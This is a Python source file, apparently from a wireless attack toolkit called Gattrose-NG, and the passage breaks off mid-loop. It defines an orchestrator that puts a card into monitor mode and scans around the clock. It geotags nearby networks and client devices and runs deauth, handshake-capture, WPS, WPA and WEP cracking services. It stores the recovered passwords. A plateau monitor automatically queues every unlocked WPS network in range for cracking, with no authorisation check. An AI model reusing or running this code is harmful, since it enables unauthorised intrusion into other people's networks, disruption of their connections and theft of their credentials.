#!/usr/bin/env python3
"""
Gattrose-NG Orchestrator Service
Master service that manages all subsystems and provides centralized status
"""

import sys
import os
import threading
import time
import signal
import json
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.services.scan_database_service import get_scan_db_service
from src.services.gps_service import get_gps_service
from src.services.wps_cracking_service import get_wps_service
from src.services.event_manager import get_event_manager
from src.services.attack_queue import AttackQueueManager, AttackType, AttackStatus, AttackJob
from src.services.wps_attack_service import WPSAttackService
from src.services.deauth_service import DeauthService
from src.services.handshake_service import HandshakeService
from src.services.wpa_crack_service import WPACrackService
from src.services.wep_crack_service import WEPCrackService
from src.services.dictionary_manager import DictionaryManager
from src.services.attack_score_manager import get_attack_score_manager
from src.database.models import init_db
from src.utils.config_db import DBConfig
from src.utils.network_safety import get_network_safety

# Global orchestrator instance
_orchestrator_instance = None


class ServiceStatus:
    """Service status information"""

    def __init__(self, name: str):
        self.name = name
        self.running = False
        self.status = "stopped"  # stopped, starting, running, error
        self.error_message = None
        self.last_update = None
        self.metadata = {}  # Service-specific metadata

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for status reporting"""
        return {
            'name': self.name,
            'running': self.running,
            'status': self.status,
            'error_message': self.error_message,
            'last_update': self.last_update.isoformat() if self.last_update else None,
            'metadata': self.metadata
        }


class OrchestratorService:
    """
    Master orchestrator for all Gattrose-NG services

    Manages:
    - WiFi scanning service
    - Database upsert worker
    - GPS service
    - Triangulation service
    - Attack queue (future)
    - WiGLE sync (future)
    """

    def __init__(self, auto_start: bool = True):
        """
        Initialize orchestrator

        Args:
            auto_start: Automatically start all services on init
        """
        self.running = False
        self._lock = threading.RLock()

        # Configuration
        self.config = None  # Will be initialized after database is ready

        # Service status tracking
        self.services = {
            'database': ServiceStatus('Database'),
            'gps': ServiceStatus('GPS'),
            'scanner': ServiceStatus('WiFi Scanner'),
            'upsert': ServiceStatus('Database Upsert'),
            'triangulation': ServiceStatus('Triangulation'),
            'wps_cracking': ServiceStatus('WPS Cracking'),
            'attack_queue': ServiceStatus('Attack Queue'),
            'deauth': ServiceStatus('Deauth Service'),
            'handshake': ServiceStatus('Handshake Service'),
            'wpa_crack': ServiceStatus('WPA Cracking'),
            'wep_crack': ServiceStatus('WEP Cracking'),
            'dictionary': ServiceStatus('Dictionary Manager'),
            'phone_tray': ServiceStatus('Phone Tray'),
        }

        # Phone tray watchdog
        self.phone_tray_process = None
        self.phone_tray_restart_count = 0
        self.phone_tray_last_restart = None

        # Attack tracking
        self.attack_in_progress = False
        self.attack_type = None  # 'wep', 'wpa', 'wps', 'pixie', 'deauth', etc.
        self.attack_target_bssid = None
        self.attack_target_ssid = None
        self.attack_start_time = None

        # Plateau detection for triggering cracking
        self.network_count_history = []  # Track network counts over time
        self.plateau_threshold = 3  # Number of samples to confirm plateau
        self.plateau_variance = 2  # Max variance to consider plateaued
        self.last_plateau_check = None

        # Service instances
        self.scan_db_service = None
        self.gps_service = None
        self.wps_service = None
        self.scanner = None  # Will be started externally or via CLI
        self.network_safety = None  # Network safety module
        self.score_manager = None  # Attack score manager with smoothing

        # Attack services
        self.attack_queue = None
        self.wps_attack_service = None
        self.deauth_service = None
        self.handshake_service = None
        self.wpa_crack_service = None
        self.wep_crack_service = None
        self.dictionary_manager = None

        # Event manager for notifications
        self.event_manager = None

        # Monitor interface (will be auto-detected)
        self.monitor_interface = None

        # Status file for IPC
        self.status_file = Path("/tmp/gattrose-status.json")

        # Initialize
        if auto_start:
            self.start()

    def start(self):
        """Start all services"""
        if self.running:
            print("[Orchestrator] Already running")
            return

        print("=" * 70)
        print("Gattrose-NG Orchestrator")
        print("=" * 70)
        print(f"[*] Starting services at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()

        self.running = True

        # 1. Initialize database
        self._start_database()

        # 2. Initialize network safety
        self._init_network_safety()

        # 3. Initialize attack score manager
        self._init_score_manager()

        # 4. Initialize event manager for notifications
        self.event_manager = get_event_manager()

        # 5. Start GPS service
        self._start_gps()

        # 3. Start scan database service (includes upsert worker + triangulation)
        self._start_scan_database()

        # 4. Auto-start WiFi scanner if monitor interface is available
        self._auto_start_scanner()

        # 5. Start WPS cracking service
        self._start_wps_service()

        # 6. Initialize attack services
        self._init_attack_services()

        # 7. Start status update thread
        self._start_status_updater()

        # 8. Start plateau monitor
        self._start_plateau_monitor()

        # 9. Start auto-attack cycle (24/7 autonomous attacking)
        self._start_auto_attack_cycle()

        # 10. Start queue processor (executes queued attacks)
        self._start_queue_processor()

        # 11. Phone tray is now part of unified_orchestrator_tray.py
        # Old phone_tray.py is deprecated - unified tray handles phone detection
        # self._start_phone_tray()
        # self._start_phone_tray_watchdog()

        print()
        print("[+] All services started successfully")
        print("[i] Status file: " + str(self.status_file))
        print()

    def _start_database(self):
        """Initialize database"""
        try:
            self._update_service_status('database', 'starting')
            print("[*] Initializing database...")

            init_db()

            # Initialize configuration (requires database)
            self.config = DBConfig()

            self._update_service_status('database', 'running')
            print("[+] Database initialized")

        except Exception as e:
            self._update_service_status('database', 'error', str(e))
            print(f"[!] Database initialization failed: {e}")

    def _init_network_safety(self):
        """Initialize network safety module"""
        try:
            print("[*] Initializing network safety...")
            self.network_safety = get_network_safety()
            print("[+] Network safety initialized")

            # Ensure NetworkManager is running
            if not self.network_safety.ensure_networkmanager_running():
                print("[!] WARNING: NetworkManager not running properly!")

            # Update connection info
            self.network_safety.update_connection_info()

        except Exception as e:
            print(f"[!] Network safety initialization failed: {e}")

    def _init_score_manager(self):
        """Initialize attack score manager with data smoothing"""
        try:
            print("[*] Initializing attack score manager...")
            self.score_manager = get_attack_score_manager(update_interval=15.0)
            self.score_manager.start()
            print("[+] Attack score manager started")

        except Exception as e:
            print(f"[!] Score manager initialization failed: {e}")

    def _start_gps(self):
        """Start GPS service"""
        try:
            self._update_service_status('gps', 'starting')
            print("[*] Starting GPS service...")

            self.gps_service = get_gps_service(enable_gps=True, enable_geoip_fallback=True)
            self.gps_service.start()

            # Wait a moment for GPS to initialize
            time.sleep(1)

            # Check GPS status
            lat, lon, alt, acc, source = self.gps_service.get_location()

            metadata = {
                'has_location': lat is not None,
                'source': source or 'none',
                'fix_quality': self.gps_service.get_fix_quality()
            }

            self._update_service_status('gps', 'running', metadata=metadata)

            if lat:
                print(f"[+] GPS service started: {lat:.6f}, {lon:.6f} ({source})")
            else:
                print("[+] GPS service started (no fix yet)")

        except Exception as e:
            self._update_service_status('gps', 'error', str(e))
            print(f"[!] GPS service failed: {e}")

    def _start_scan_database(self):
        """Start scan database service (includes upsert + triangulation)"""
        try:
            self._update_service_status('upsert', 'starting')
            self._update_service_status('triangulation', 'starting')
            print("[*] Starting scan database service...")

            # Get scan database service (singleton)
            self.scan_db_service = get_scan_db_service()

            # Start upsert worker (runs every 10s)
            self.scan_db_service.start_upsert_worker()

            # Upsert worker includes triangulation (runs every 60s)
            self._update_service_status('upsert', 'running', metadata={
                'interval': self.scan_db_service.upsert_interval
            })
            self._update_service_status('triangulation', 'running', metadata={
                'interval': self.scan_db_service.triangulation_interval
            })

            print(f"[+] Database upsert worker started (interval: {self.scan_db_service.upsert_interval}s)")
            print(f"[+] Triangulation service started (interval: {self.scan_db_service.triangulation_interval}s)")

        except Exception as e:
            self._update_service_status('upsert', 'error', str(e))
            self._update_service_status('triangulation', 'error', str(e))
            print(f"[!] Scan database service failed: {e}")

    def _auto_start_scanner(self):
        """Auto-detect and start WiFi scanner if 24/7 mode is enabled"""
        try:
            # Check if 24/7 scanning is enabled
            if not self.config:
                print("[!] Config not initialized - skipping auto-start")
                return

            scan_24_7 = self.config.get('service.scan_24_7', False)

            if not scan_24_7:
                print("[i] 24/7 scan mode disabled - auto-start skipped")
                print("[i] Enable 24/7 mode in settings to auto-start data collection")
                self._update_service_status('scanner', 'stopped')
                return

            print("[*] 24/7 scan mode ENABLED - starting continuous data collection...")

            import subprocess
            import shutil

            # Try to detect monitor interface using ip link (more reliable than iwconfig)
            monitor_iface = None

            # First try iw dev to find monitor interfaces (most reliable)
            try:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
                current_iface = None
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line.startswith('Interface '):
                        current_iface = line.split('Interface ')[1].strip()
                    elif 'type monitor' in line.lower() and current_iface:
                        monitor_iface = current_iface
                        break
            except Exception as e:
                print(f"[!] iw dev check failed: {e}")

            # If not found, check ip link for mon interfaces (legacy naming)
            if not monitor_iface:
                try:
                    result = subprocess.run(['/usr/sbin/ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split('\n'):
                        if 'mon' in line and ': ' in line:
                            parts = line.split(': ')
                            if len(parts) >= 2:
                                iface = parts[1].split('@')[0].split(':')[0]
                                if 'mon' in iface:
                                    monitor_iface = iface
                                    break
                except Exception as e:
                    print(f"[!] ip link check failed: {e}")

            # If not found, try iwconfig (with full path) - legacy fallback
            if not monitor_iface:
                iwconfig_path = shutil.which('iwconfig') or '/usr/sbin/iwconfig'
                try:
                    result = subprocess.run([iwconfig_path], capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split('\n'):
                        if 'Mode:Monitor' in line:
                            monitor_iface = line.split()[0]
                            break
                except Exception as e:
                    print(f"[!] iwconfig check failed: {e}")

            if monitor_iface:
                print(f"[*] Detected monitor interface: {monitor_iface}")
                self._start_scanner(monitor_iface)
            else:
                print("[!] No monitor interface found - attempting to enable monitor mode...")

                # Try to enable monitor mode on first wireless interface
                monitor_iface = self._enable_monitor_mode()

                if monitor_iface:
                    print(f"[+] Monitor mode enabled on {monitor_iface}")
                    self._start_scanner(monitor_iface)
                else:
                    print("[!] Failed to enable monitor mode - WiFi scanner not started")
                    print("[i] Enable monitor mode manually, then use API to start scanner")
                    self._update_service_status('scanner', 'stopped')

            # TODO: Start Bluetooth scanner if enabled
            # bt_enabled = self.config.get('bluetooth.enabled', False)
            # if bt_enabled:
            #     self._start_bluetooth_scanner()

            # TODO: Start SDR scanner if enabled
            # sdr_enabled = self.config.get('sdr.enabled', False)
            # if sdr_enabled:
            #     self._start_sdr_scanner()

        except Exception as e:
            print(f"[!] Auto-start scanner failed: {e}")
            self._update_service_status('scanner', 'error', str(e))

    def _start_scanner(self, interface: str = "wlan0mon", channel: Optional[str] = None):
        """Start WiFi scanner (airodump + CSV parser)"""
        try:
            self._update_service_status('scanner', 'starting')
            print(f"[*] Starting WiFi scanner on {interface}...")

            # Start airodump-ng process
            import subprocess
            from pathlib import Path
            from datetime import datetime

            # Create captures directory
            captures_dir = PROJECT_ROOT / 'data' / 'captures'
            captures_dir.mkdir(parents=True, exist_ok=True)

            # Generate output filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            csv_base = captures_dir / f"scan_{timestamp}"

            # Build airodump command
            cmd = [
                'sudo', 'airodump-ng',
                '--output-format', 'csv',
                '--write', str(csv_base),
                '--write-interval', '1',
                '--background', '1'
            ]

            if channel:
                cmd.extend(['--channel', channel])

            cmd.append(interface)

            # Start airodump
            self.scanner_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # Wait a moment for CSV to be created
            time.sleep(2)

            self.scanner_csv_file = f"{csv_base}-01.csv"

            # Start CSV parser thread
            import threading
            self.scanner_running = True
            self.scanner_thread = threading.Thread(target=self._scanner_csv_parser, daemon=True)
            self.scanner_thread.start()

            self._update_service_status('scanner', 'running', metadata={
                'interface': interface,
                'channel': channel or 'all'
            })

            print(f"[+] WiFi scanner started on {interface}")
            print(f"[+] CSV file: {self.scanner_csv_file}")

        except Exception as e:
            self._update_service_status('scanner', 'error', str(e))
            print(f"[!] WiFi scanner failed: {e}")
            import traceback
            traceback.print_exc()

    def _scanner_csv_parser(self):
        """Continuously parse CSV file from airodump-ng"""
        import csv as csv_module
        from pathlib import Path

        csv_path = Path(self.scanner_csv_file)
        last_size = 0

        print(f"[*] CSV parser started, monitoring: {csv_path}")

        while self.scanner_running:
            try:
                if csv_path.exists():
                    current_size = csv_path.stat().st_size
                    if current_size > last_size:
                        # File has grown, parse it
                        self._parse_airodump_csv(csv_path)
                        last_size = current_size

                time.sleep(2)  # Parse every 2 seconds

            except Exception as e:
                print(f"[!] CSV parser error: {e}")
                time.sleep(5)

        print("[*] CSV parser stopped")

    def _parse_airodump_csv(self, csv_path: Path):
        """Parse airodump CSV and update database"""
        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Split into AP and Client sections
            if '\r\n\r\n' in content:
                sections = content.split('\r\n\r\n')
            elif '\n\n' in content:
                sections = content.split('\n\n')
            else:
                return  # Not ready yet

            if len(sections) < 2:
                return

            # Parse networks
            self._parse_ap_section(sections[0])

            # Parse clients
            self._parse_client_section(sections[1])

        except Exception as e:
            print(f"[!] CSV parse error: {e}")

    def _parse_ap_section(self, section: str):
        """Parse Access Points section"""
        import csv as csv_module
        from datetime import datetime

        try:
            lines = section.strip().split('\n')
            if len(lines) < 2:
                return

            # Skip header line
            for line in lines[1:]:
                if not line.strip() or line.startswith('BSSID'):
                    continue

                try:
                    row = list(csv_module.reader([line]))[0] if line else []
                    if len(row) < 14:
                        continue

                    bssid = row[0].strip()
                    if not bssid or bssid == 'BSSID':
                        continue

                    # Parse data
                    power = None
                    try:
                        power = int(row[8].strip()) if row[8].strip() and row[8].strip() != '-1' else None
                    except:
                        pass

                    # Get GPS location
                    latitude, longitude, altitude, gps_accuracy, gps_source = None, None, None, None, None
                    if self.gps_service:
                        latitude, longitude, altitude, gps_accuracy, gps_source = self.gps_service.get_location()

                    network_data = {
                        'bssid': bssid,
                        'ssid': row[13].strip() if len(row) > 13 else None,
                        'channel': int(row[3].strip()) if row[3].strip().isdigit() else None,
                        'encryption': row[5].strip() if row[5].strip() else None,
                        'cipher': row[6].strip() if row[6].strip() else None,
                        'authentication': row[7].strip() if row[7].strip() else None,
                        'power': power,
                        'beacon_count': int(row[9].strip()) if row[9].strip().isdigit() else 0,
                        'iv_count': int(row[10].strip()) if row[10].strip().isdigit() else 0,
                        'first_seen': datetime.strptime(row[1].strip(), "%Y-%m-%d %H:%M:%S") if row[1].strip() else None,
                        'last_seen': datetime.strptime(row[2].strip(), "%Y-%m-%d %H:%M:%S") if row[2].strip() else None,
                        'latitude': latitude,
                        'longitude': longitude,
                        'altitude': altitude,
                        'gps_accuracy': gps_accuracy,
                        'gps_source': gps_source
                    }

                    self.scan_db_service.update_network(network_data)

                except Exception as e:
                    pass  # Skip bad rows

        except Exception as e:
            print(f"[!] AP section parse error: {e}")

    def _parse_client_section(self, section: str):
        """Parse Clients section"""
        import csv as csv_module
        from datetime import datetime

        try:
            lines = section.strip().split('\n')
            if len(lines) < 2:
                return

            for line in lines[1:]:
                if not line.strip() or line.startswith('Station MAC'):
                    continue

                try:
                    row = list(csv_module.reader([line]))[0] if line else []
                    if len(row) < 6:
                        continue

                    mac = row[0].strip()
                    if not mac:
                        continue

                    bssid = row[5].strip() if len(row) > 5 else None
                    if bssid == '(not associated)':
                        bssid = None

                    power = None
                    try:
                        power = int(row[3].strip()) if row[3].strip() and row[3].strip() != '-1' else None
                    except:
                        pass

                    # Get GPS location
                    latitude, longitude, altitude, gps_accuracy, gps_source = None, None, None, None, None
                    if self.gps_service:
                        latitude, longitude, altitude, gps_accuracy, gps_source = self.gps_service.get_location()

                    client_data = {
                        'mac_address': mac,
                        'bssid': bssid,
                        'power': power,
                        'packets': int(row[4].strip()) if row[4].strip().isdigit() else 0,
                        'first_seen': datetime.strptime(row[1].strip(), "%Y-%m-%d %H:%M:%S") if row[1].strip() else None,
                        'last_seen': datetime.strptime(row[2].strip(), "%Y-%m-%d %H:%M:%S") if row[2].strip() else None,
                        'latitude': latitude,
                        'longitude': longitude,
                        'altitude': altitude,
                        'gps_accuracy': gps_accuracy,
                        'gps_source': gps_source
                    }

                    self.scan_db_service.update_client(client_data)

                except Exception as e:
                    pass  # Skip bad rows

        except Exception as e:
            print(f"[!] Client section parse error: {e}")

    def _start_wps_service(self):
        """Start WPS cracking service"""
        try:
            self._update_service_status('wps_cracking', 'starting')
            print("[*] Starting WPS cracking service...")

            # Get monitor interface from scanner if available
            monitor_iface = "wlan0mon"
            if hasattr(self, 'scanner') and self.scanner:
                monitor_iface = getattr(self.scanner, 'interface', "wlan0mon")

            # Initialize WPS service
            self.wps_service = get_wps_service(monitor_interface=monitor_iface)

            # Set result callback to store cracked networks
            self.wps_service.on_result_callback = self._on_wps_result

            # Start service
            self.wps_service.start()

            self._update_service_status('wps_cracking', 'running', metadata={
                'interface': monitor_iface,
                'queue_size': 0,
                'total_cracked': 0
            })

            print(f"[+] WPS cracking service started")

        except Exception as e:
            self._update_service_status('wps_cracking', 'error', str(e))
            print(f"[!] WPS cracking service failed: {e}")

    def _on_wps_result(self, target: Dict, result: Dict):
        """Handle WPS cracking result"""
        try:
            print(f"\n[WPS] Cracking result for {target['ssid']} ({target['bssid']})")
            print(f"[WPS] Status: {result['status']}")

            if result['status'] == 'cracked':
                print(f"[WPS] ✓ CRACKED! PIN: {result['pin']}, PSK: {result['psk']}")

                # Store in database
                from src.database.models import get_session, Network
                session = get_session()
                try:
                    network = session.query(Network).filter_by(bssid=target['bssid']).first()
                    if network:
                        # Update network with cracked credentials
                        network.wps_pin = result['pin']
                        network.password = result['psk']
                        network.is_cracked = True
                        network.cracked_at = datetime.utcnow()
                        session.commit()
                        print(f"[WPS] Stored credentials for {target['ssid']}")
                    else:
                        print(f"[WPS] Network {target['bssid']} not found in database")
                finally:
                    session.close()

            elif result['status'] == 'locked':
                print(f"[WPS] Network is rate-limited/locked")
            else:
                print(f"[WPS] Failed: {result.get('error', 'Unknown error')}")

            # Update service stats
            if self.wps_service:
                stats = self.wps_service.stats
                self._update_service_status('wps_cracking', 'running', metadata={
                    'queue_size': self.wps_service.get_status()['queue_size'],
                    'total_cracked': stats['total_cracked'],
                    'total_attempted': stats['total_attempted'],
                    'total_locked': stats['total_locked']
                })

        except Exception as e:
            print(f"[WPS] Error handling result: {e}")
            import traceback
            traceback.print_exc()

    def _start_phone_tray(self):
        """Start phone tray icon process"""
        try:
            self._update_service_status('phone_tray', 'starting')
            print("[*] Starting phone tray...")

            import subprocess

            # Check if already running
            try:
                result = subprocess.run(['pgrep', '-f', 'phone_tray.py'],
                                      capture_output=True, text=True, timeout=5)
                if result.stdout.strip():
                    pid = int(result.stdout.strip().split('\n')[0])
                    print(f"[+] Phone tray already running (PID {pid})")
                    self.phone_tray_process = pid
                    self._update_service_status('phone_tray', 'running', metadata={'pid': pid})
                    return
            except Exception as e:
                print(f"[!] Error checking for existing phone tray: {e}")

            # Start phone tray as background process
            phone_tray_script = Path(__file__).parent.parent / "phone_tray.py"

            if not phone_tray_script.exists():
                print(f"[!] Phone tray script not found: {phone_tray_script}")
                self._update_service_status('phone_tray', 'error',
                                          error_message="Script not found")
                return

            # Start as subprocess in background
            env = os.environ.copy()
            env['DISPLAY'] = ':1'  # Set display for Qt
            env['QT_QPA_PLATFORM'] = 'xcb'

            # Get XAUTHORITY dynamically
            try:
                xauth_result = subprocess.run(
                    ['bash', '-c', 'ls /run/user/1000/xauth_* 2>/dev/null | head -1'],
                    capture_output=True, text=True, timeout=5
                )
                if xauth_result.stdout.strip():
                    env['XAUTHORITY'] = xauth_result.stdout.strip()
            except:
                pass

            # Start phone tray as daemon (as user, not root)
            # Get the actual user (not root even if sudo)
            real_user = os.environ.get('SUDO_USER', os.environ.get('USER', 'eurrl'))

            process = subprocess.Popen(
                ['sudo', '-u', real_user, sys.executable, str(phone_tray_script)],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True  # Detach from parent
            )

            # Wait a moment to see if it crashes immediately
            import time
            time.sleep(2)

            if process.poll() is None:
                # Still running
                self.phone_tray_process = process.pid
                self._update_service_status('phone_tray', 'running',
                                          metadata={'pid': process.pid})
                print(f"[+] Phone tray started (PID {process.pid})")
            else:
                # Process died
                self._update_service_status('phone_tray', 'error',
                                          error_message="Process died immediately after start")
                print(f"[!] Phone tray process died immediately (exit code: {process.returncode})")

        except Exception as e:
            self._update_service_status('phone_tray', 'error', str(e))
            print(f"[!] Phone tray start failed: {e}")
            import traceback
            traceback.print_exc()

    def _start_phone_tray_watchdog(self):
        """Start watchdog thread to monitor and restart phone tray if it dies"""
        def watchdog_loop():
            print("[*] Phone tray watchdog started")

            while self.running:
                try:
                    time.sleep(30)  # Check every 30 seconds

                    # Check if phone tray is running
                    is_running = False
                    current_pid = None

                    if self.phone_tray_process:
                        # Check if PID is still alive
                        try:
                            import subprocess
                            result = subprocess.run(['ps', '-p', str(self.phone_tray_process)],
                                                  capture_output=True, timeout=5)
                            if result.returncode == 0:
                                is_running = True
                                current_pid = self.phone_tray_process
                        except:
                            pass

                    # Double-check with pgrep
                    if not is_running:
                        try:
                            import subprocess
                            result = subprocess.run(['pgrep', '-f', 'phone_tray.py'],
                                                  capture_output=True, text=True, timeout=5)
                            if result.stdout.strip():
                                pid = int(result.stdout.strip().split('\n')[0])
                                is_running = True
                                current_pid = pid
                                self.phone_tray_process = pid
                        except:
                            pass

                    if is_running:
                        # Phone tray is running, update status
                        self._update_service_status('phone_tray', 'running',
                                                  metadata={'pid': current_pid,
                                                           'restart_count': self.phone_tray_restart_count})
                    else:
                        # Phone tray is dead, restart it
                        print(f"[WATCHDOG] Phone tray is dead! Restarting...")

                        # Rate limiting: Don't restart more than once every 2 minutes
                        if self.phone_tray_last_restart:
                            time_since_restart = time.time() - self.phone_tray_last_restart
                            if time_since_restart < 120:
                                print(f"[WATCHDOG] Rate limit: Last restart was {time_since_restart:.0f}s ago, waiting...")
                                self._update_service_status('phone_tray', 'error',
                                                          error_message="Dead (rate limited)")
                                continue

                        # Restart phone tray
                        self.phone_tray_last_restart = time.time()
                        self.phone_tray_restart_count += 1

                        self._update_service_status('phone_tray', 'restarting',
                                                  metadata={'restart_count': self.phone_tray_restart_count})

                        self._start_phone_tray()

                        if self.phone_tray_process:
                            print(f"[WATCHDOG] ✓ Phone tray restarted successfully (restart #{self.phone_tray_restart_count})")
                        else:
                            print(f"[WATCHDOG] ✗ Phone tray restart failed (attempt #{self.phone_tray_restart_count})")

                except Exception as e:
                    print(f"[WATCHDOG] Error in phone tray watchdog: {e}")
                    import traceback
                    traceback.print_exc()

        self.phone_tray_watchdog_thread = threading.Thread(target=watchdog_loop, daemon=True)
        self.phone_tray_watchdog_thread.start()
        print("[+] Phone tray watchdog enabled (30s check interval)")

    def _init_attack_services(self):
        """Initialize all attack services"""
        try:
            print("[*] Initializing attack services...")

            # Detect monitor interface
            self.monitor_interface = self._detect_monitor_interface()
            if not self.monitor_interface:
                print("[!] No monitor interface detected - attack services disabled")
                return

            print(f"[i] Using monitor interface: {self.monitor_interface}")

            # 1. Attack Queue Manager
            self._update_service_status('attack_queue', 'starting')
            self.attack_queue = AttackQueueManager()
            self._update_service_status('attack_queue', 'running', metadata={
                'queued': 0,
                'running': 0,
                'completed': 0
            })
            print("[+] Attack queue initialized")

            # 2. Dictionary Manager
            self._update_service_status('dictionary', 'starting')
            self.dictionary_manager = DictionaryManager()
            stats = self.dictionary_manager.get_statistics()
            self._update_service_status('dictionary', 'running', metadata={
                'total_passwords': stats['total_passwords'],
                'unique_sources': stats['unique_sources']
            })
            print(f"[+] Dictionary manager initialized ({stats['total_passwords']:,} passwords)")

            # 3. WPS Attack Service
            self.wps_attack_service = WPSAttackService(self.monitor_interface)
            print("[+] WPS attack service initialized")

            # 4. Deauth Service
            self._update_service_status('deauth', 'running')
            self.deauth_service = DeauthService(self.monitor_interface)
            print("[+] Deauth service initialized")

            # 5. Handshake Service
            self._update_service_status('handshake', 'running')
            self.handshake_service = HandshakeService(self.monitor_interface)
            print("[+] Handshake service initialized")

            # 6. WPA Crack Service
            self._update_service_status('wpa_crack', 'starting')
            self.wpa_crack_service = WPACrackService()
            available, msg = self.wpa_crack_service.check_hashcat_available()
            self._update_service_status('wpa_crack', 'running' if available else 'error',
                                       error_message=None if available else msg,
                                       metadata={'hashcat_available': available, 'info': msg})
            if available:
                print(f"[+] WPA crack service initialized - {msg}")
            else:
                print(f"[!] WPA crack service - {msg}")

            # 7. WEP Crack Service
            self._update_service_status('wep_crack', 'starting')
            self.wep_crack_service = WEPCrackService(self.monitor_interface)
            available, msg = self.wep_crack_service.check_requirements()
            self._update_service_status('wep_crack', 'running' if available else 'error',
                                       error_message=None if available else msg,
                                       metadata={'tools_available': available, 'info': msg})
            if available:
                print(f"[+] WEP crack service initialized - {msg}")
            else:
                print(f"[!] WEP crack service - {msg}")

            print("[+] All attack services initialized")

        except Exception as e:
            print(f"[!] Attack services initialization failed: {e}")
            import traceback
            traceback.print_exc()

    def _detect_monitor_interface(self) -> Optional[str]:
        """Auto-detect monitor interface"""
        try:
            import subprocess

            # Try iw dev (most reliable)
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
            current_iface = None
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface '):
                    current_iface = line.split('Interface ')[1].strip()
                elif 'type monitor' in line.lower() and current_iface:
                    return current_iface

            # Try ip link
            result = subprocess.run(['/usr/sbin/ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'mon' in line and ': ' in line:
                    parts = line.split(': ')
                    if len(parts) >= 2:
                        iface = parts[1].split('@')[0].split(':')[0]
                        if 'mon' in iface:
                            return iface

            return None

        except Exception as e:
            print(f"[!] Monitor interface detection failed: {e}")
            return None

    def _enable_monitor_mode(self) -> Optional[str]:
        """Enable monitor mode on first available wireless interface"""
        try:
            import subprocess

            # Find wireless interfaces
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
            wireless_iface = None

            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface '):
                    iface = line.split('Interface ')[1].strip()
                    # Skip already-monitor interfaces and virtual interfaces
                    if 'mon' not in iface and 'ap' not in iface:
                        wireless_iface = iface
                        break

            if not wireless_iface:
                print("[!] No wireless interface found to enable monitor mode")
                return None

            print(f"[*] Enabling monitor mode on {wireless_iface}...")

            # Kill interfering processes (preserve NetworkManager)
            try:
                subprocess.run(['sudo', 'pkill', '-9', 'wpa_supplicant'],
                              capture_output=True, timeout=5)
                subprocess.run(['sudo', 'pkill', '-9', 'dhclient'],
                              capture_output=True, timeout=5)
            except Exception:
                pass  # Not critical

            # Enable monitor mode using airmon-ng
            result = subprocess.run(['sudo', 'airmon-ng', 'start', wireless_iface],
                                   capture_output=True, text=True, timeout=10)

            # Parse output to find monitor interface name
            monitor_iface = None
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                    # Look for interface name in the line
                    parts = line.split()
                    for part in parts:
                        if 'mon' in part.lower():
                            monitor_iface = part.strip('[]()').strip()
                            break

            # If not found in output, try default naming
            if not monitor_iface:
                monitor_iface = f"{wireless_iface}mon"

            # Verify the interface actually exists
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
            if monitor_iface not in result.stdout:
                print(f"[!] Monitor interface {monitor_iface} not found after airmon-ng")
                return None

            return monitor_iface

        except Exception as e:
            print(f"[!] Failed to enable monitor mode: {e}")
            import traceback
            traceback.print_exc()
            return None

    def _start_plateau_monitor(self):
        """Start background thread to monitor for network plateau and trigger cracking"""
        def plateau_loop():
            while self.running:
                try:
                    time.sleep(30)  # Check every 30 seconds
                    self._check_plateau_and_crack()
                except Exception as e:
                    print(f"[!] Plateau monitor error: {e}")

        self.plateau_thread = threading.Thread(target=plateau_loop, daemon=True)
        self.plateau_thread.start()
        print("[*] Plateau monitor started")

    def _check_plateau_and_crack(self):
        """Check if network count has plateaued and trigger WPS cracking"""
        try:
            # Get current network count from database
            from src.database.models import get_session
            from src.database.models import CurrentScanNetwork

            session = get_session()
            try:
                network_count = session.query(CurrentScanNetwork).count()
                wps_count = session.query(CurrentScanNetwork).filter(
                    CurrentScanNetwork.wps_enabled == True,
                    CurrentScanNetwork.wps_locked == False
                ).count()

                # Add to history
                self.network_count_history.append(network_count)

                # Keep only last N samples
                if len(self.network_count_history) > self.plateau_threshold + 2:
                    self.network_count_history.pop(0)

                # Check if we have enough samples
                if len(self.network_count_history) < self.plateau_threshold:
                    return

                # Check for plateau (counts are stable)
                recent_counts = self.network_count_history[-self.plateau_threshold:]
                avg_count = sum(recent_counts) / len(recent_counts)
                variance = max(recent_counts) - min(recent_counts)

                if variance <= self.plateau_variance:
                    # Plateau detected!
                    print(f"[PLATEAU] Network count stable at ~{int(avg_count)} (variance: {variance})")

                    if wps_count > 0:
                        print(f"[PLATEAU] Found {wps_count} unlocked WPS networks - starting cracking")
                        self._queue_wps_networks_for_cracking()
                    else:
                        print(f"[PLATEAU] No unlocked WPS networks to crack")

                    # Reset history after triggering
                    self.network_count_history = []

            finally:
                session.close()

        except Exception as e:
            print(f"[!] Plateau check error: {e}")
            import traceback
            traceback.print_exc()

    def _queue_wps_networks_for_cracking(self):
        """Queue all unlocked WPS networks for cracking"""
        try:
            from src.database.models import get_session, CurrentScanNetwork

            if not self.wps_service:
                print("[!] WPS service not initialized")
                return

            session = get_session()
            try:
                # Get all unlocked WPS networks that haven't been cracked
                wps_networks = session.query(CurrentScanNetwork).filter(
                    CurrentScanNetwork.wps_enabled == True,
                    CurrentScanNetwork.wps_locked == False
                ).all()

                # Ensure NetworkManager is running
                if self.network_safety:
                    self.network_safety.ensure_networkmanager_running()

                added_count = 0
                for network in wps_networks:
